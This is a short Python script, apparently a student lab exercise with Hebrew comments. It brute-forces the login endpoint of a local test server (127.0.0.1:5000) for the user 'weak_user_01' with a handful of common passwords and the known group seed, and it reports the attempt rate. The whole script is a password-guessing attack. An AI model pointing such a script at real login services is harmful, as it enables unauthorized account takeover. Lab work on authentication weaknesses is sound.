import time
import requests
from config import GROUP_SEED

BASE_URL = "http://127.0.0.1:5000"

# את מי תוקפים – אפשר להחליף למשתמש אחר מה-dataset
TARGET_USERNAME = "weak_user_01"

# רשימת סיסמאות לניסיון (במטלה האמיתית תרצה רשימה הרבה יותר גדולה)
# כאן יש כמה טעויות בכוונה, ובסוף הסיסמה הנכונה (GROUP_SEED)
CANDIDATE_PASSWORDS = [
    "00000000",
    "11111111",
    "12345678",
    "password",
    "qwerty12",
    str(GROUP_SEED),  # The correct password (GROUP_SEED)
]


def brute_force_login():
    total_attempts = 0
    success = False
    success_password = None

    start = time.perf_counter()

    for pw in CANDIDATE_PASSWORDS:
        total_attempts += 1
        payload = {"username": TARGET_USERNAME, "password": pw}

        resp = requests.post(f"{BASE_URL}/login", json=payload)

        if resp.status_code == 200:
            success = True
            success_password = pw
            break

    duration = time.perf_counter() - start
    attempts_per_sec = total_attempts / duration if duration > 0 else float("inf")

    print("=== Brute-Force Summary ===")
    print(f"Target username: {TARGET_USERNAME}")
    print(f"Total attempts: {total_attempts}")
    print(f"Total time: {duration:.4f} seconds")
    print(f"Attempts per second: {attempts_per_sec:.2f}")

    if success:
        print(f"SUCCESS! Password found: {success_password}")
    else:
        print("FAILED: Password not found in candidate list")


if __name__ == "__main__":
    brute_force_login()

